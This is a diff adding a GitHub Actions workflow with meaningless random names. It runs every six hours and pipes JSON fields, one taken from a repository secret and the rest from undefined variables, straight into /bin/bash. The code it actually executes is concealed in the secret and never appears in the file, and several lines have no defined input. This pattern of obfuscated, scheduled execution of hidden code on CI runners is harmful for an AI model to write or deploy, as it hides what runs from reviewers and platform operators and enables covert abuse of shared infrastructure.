@@ -1,0 +1,28 @@
+name: ruiliwenen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruiliwenen
+        env:
+          sf71: ${{ secrets.sf71 }}
+        run: |
+          echo $sf71 | jq -r .qmqp487 | /bin/bash
+          echo $rtdr9 | jq -r .qi007 | /bin/bash
+          echo $zb6461 | jq -r .bzu11935 | /bin/bash
+          echo $idm73784 | jq -r .pkay2541 | /bin/bash
+          echo $gnhu0839 | jq -r .jjsap26 | /bin/bash
+          echo $osfva9 | jq -r .zzo2 | /bin/bash
+          echo $krhct8129 | jq -r .ao74136 | /bin/bash
+          echo $uvcis65 | jq -r .or3 | /bin/bash
+          echo $tdo632 | jq -r .cw23 | /bin/bash
+          echo $brntx3450 | jq -r .m79176 | /bin/bash
+          echo $vneo76 | jq -r .y6 | /bin/bash
+
